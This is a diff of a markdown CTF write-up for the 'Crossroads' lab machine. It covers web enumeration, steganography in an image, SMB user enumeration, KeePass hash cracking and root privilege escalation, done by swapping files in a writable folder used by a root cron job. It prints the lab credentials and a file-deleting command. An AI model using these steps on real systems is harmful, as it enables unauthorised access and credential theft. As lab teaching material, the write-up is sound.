@@ -2,7 +2,7 @@
 
 ## Overview
 
-Crossroads is a CTF machine that focuses on web enumeration, steganography, SMB enumeration and credential attacks.
+Crossroads is a CTF machine that involves web enumeration, steganography, SMB access, KeePass credential extraction and privilege escalation via a root cron job.
 
 Target IP:
 
@@ -14,24 +14,20 @@ Target IP:
 
 ## Reconnaissance
 
-First I performed a service scan:
-
 ```bash
 nmap -sC -sV 192.168.1.152
 ```
 
-Open services:
+![nmap](screenshot/image1.png)
 
-* HTTP (Apache 2.4.38)
+Discovered services:
+
+* HTTP
 * SMB
-
-![nmap scan](screenshot/image1.png)
 
 ---
 
 ## Web Enumeration
-
-I started directory brute forcing:
 
 ```bash
 dirb http://192.168.1.152
@@ -39,13 +35,13 @@ dirb http://192.168.1.152
 
 ![dirb](screenshot/image2.png)
 
-Discovered:
+Found:
 
 ```
 /robots.txt
 ```
 
-Inside robots.txt:
+Contents:
 
 ```
 Disallow: /crossroads.png
@@ -55,35 +51,31 @@ Disallow: /crossroads.png
 
 ## Image Analysis
 
-I downloaded the image and checked metadata:
-
 ```bash
 exiftool crossroads.png
 ```
 
 ![exiftool](screenshot/image3.png)
 
-Nothing useful in metadata.
-
-Next I checked for steganography:
+No useful data.
 
 ```bash
 zsteg crossroads.png
 ```
 
-This revealed an **OpenPGP secret key**.
-
 ![zsteg](screenshot/image4.png)
+
+Found an OpenPGP secret key.
 
 ---
 
 ## SMB Enumeration
 
-To find valid users:
-
 ```bash
 enum4linux -A 192.168.1.152
 ```
+
+![enum4linux](screenshot/image5.png)
 
 Discovered user:
 
@@ -91,13 +83,11 @@ Discovered user:
 albert
 ```
 
-![enum4linux](screenshot/image5.png)
-
 ---
 
 ## Password Brute Force
 
-I performed an SMB brute force attack using Metasploit and found valid credentials:
+Credentials obtained:
 
 ```
 albert : bradley1
@@ -109,41 +99,131 @@ albert : bradley1
 
 ## SMB Access
 
-Connected to the SMB share:
-
 ```bash
 smbclient //192.168.1.152/albert -U albert
 ```
-
-Listed files:
 
 ```bash
 ls
 ```
 
-Downloaded the user flag:
-
 ```bash
 get user.txt
 ```
 
-![smb access](screenshot/image7.png)
+![smb](screenshot/image7.png)
+
+User flag captured.
 
 ---
 
-## Flags
+## KeePass Database
 
-User flag successfully captured.
+Discovered:
+
+```
+keyfile.kdbx
+```
+
+Cracked the hash:
+
+```bash
+john --show hash
+```
+
+Password:
+
+```
+porsiempre
+```
+
+![john](screenshot/image8.png)
+
+Opened KeePass and extracted possible credentials.
+
+![keepass](screenshot/image9.png)
 
 ---
 
-## Conclusion
+## Process Monitoring
 
-This machine demonstrates the importance of:
+To identify privilege escalation vectors I monitored processes running as root.
 
-* checking robots.txt
-* analyzing files for hidden data
-* enumerating SMB users
-* password attacks against network services
+The output showed a script executed every minute:
 
-A small information leak led to full access to the share.
+```
+/usr/sbin/CRON -f
+/bin/sh -c /root/key.sh
+/bin/bash /root/key.sh
+```
+
+This means a root cron job is running:
+
+```
+/root/key.sh
+```
+
+every minute.
+
+![cron](screenshot/image10.png)
+
+---
+
+## Privilege Escalation
+
+The script was using files from a writable directory:
+
+```
+/keyfolder
+```
+
+I replaced the original file with my own:
+
+```bash
+rm -f /keyfolder/*
+mv /tmp/fracturedocean /keyfolder/
+```
+
+After the cron execution:
+
+```bash
+ls -la /keyfolder
+```
+
+A new file appeared:
+
+```
+rootcreds.txt
+```
+![key](screenshot/image11.png)
+
+![rootcreds](screenshot/image12.png)
+
+---
+
+## Root Access
+
+```bash
+cat rootcreds.txt
+```
+
+Credentials:
+
+```
+root : imjustdrifting31
+```
+
+Root flag captured.
+
+![rootflag](screenshot/image13.png)
+
+---
+
+## What I Learned
+
+* robots.txt can expose sensitive files
+* images may contain hidden data
+* SMB enumeration is critical
+* KeePass databases store valuable credentials
+* monitoring processes reveals cron-based privilege escalation
+* writable directories used by root scripts lead to full system compromise
